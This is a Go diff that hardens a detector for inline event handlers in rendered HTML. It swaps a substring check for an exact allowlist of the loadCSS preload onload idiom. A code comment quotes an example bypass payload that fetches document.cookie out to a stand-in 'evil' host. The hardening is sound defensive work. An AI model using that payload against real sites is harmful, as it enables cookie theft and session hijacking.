@@ -513,6 +513,31 @@ func checkRenderedInlineEventHandlers(doc *html.Node) renderCheckResult {
 	return renderCheckResult{Check: "security_inline_event_handlers", Status: "pass"}
 }
 
+// benignStylesheetPreloadOnloadValues is the exact, known-safe loadCSS
+// polyfill idiom for lazy-loading a stylesheet via <link rel=preload
+// as=style onload=...>. isBenignStylesheetPreloadOnload requires an exact
+// match (after trimming/case-folding) against one of these — not a substring
+// containment check — because this function's only job is to exempt a
+// specific known-benign static theme pattern from
+// checkRenderedInlineEventHandlers, the detector that exists to catch
+// injected inline event handlers. A Contains-based check would let an
+// attacker-controlled onload value that merely embeds this substring (e.g.
+// `onload="this.rel='stylesheet';fetch('https://evil/x?c='+document.cookie)"`)
+// slip past the detector unflagged, defeating its purpose for the one
+// pattern most likely to actually be exploited.
+//
+// Only the this.onload=null;this.rel=... form is listed: it's the one
+// pattern LoveIt's own layouts/_partials/plugin/style.html actually emits
+// (single-quoted). A bare this.rel=... with no this.onload=null prefix
+// leaves the handler attached after firing once — that's not what the
+// theme does, and it would be a weaker, more injection-shaped signal to
+// wave through, so it's deliberately not included without a confirmed
+// emitter for it.
+var benignStylesheetPreloadOnloadValues = map[string]struct{}{
+	`this.onload=null;this.rel='stylesheet'`: {},
+	`this.onload=null;this.rel="stylesheet"`: {},
+}
+
 func isBenignStylesheetPreloadOnload(n *html.Node, key, val string) bool {
 	if n == nil || n.Type != html.ElementNode || n.Data != "link" || key != "onload" {
 		return false
@@ -520,8 +545,12 @@ func isBenignStylesheetPreloadOnload(n *html.Node, key, val string) bool {
 	rel := strings.ToLower(strings.TrimSpace(htmlAttr(n, "rel")))
 	as := strings.ToLower(strings.TrimSpace(htmlAttr(n, "as")))
 	val = strings.ToLower(strings.TrimSpace(val))
-	return rel == "preload" && as == "style" &&
-		(strings.Contains(val, "this.rel='stylesheet'") || strings.Contains(val, `this.rel="stylesheet"`))
+	val = strings.TrimSuffix(val, ";")
+	if rel != "preload" || as != "style" {
+		return false
+	}
+	_, ok := benignStylesheetPreloadOnloadValues[val]
+	return ok
 }
 
 func previewPrefixFromPath(path string) string {
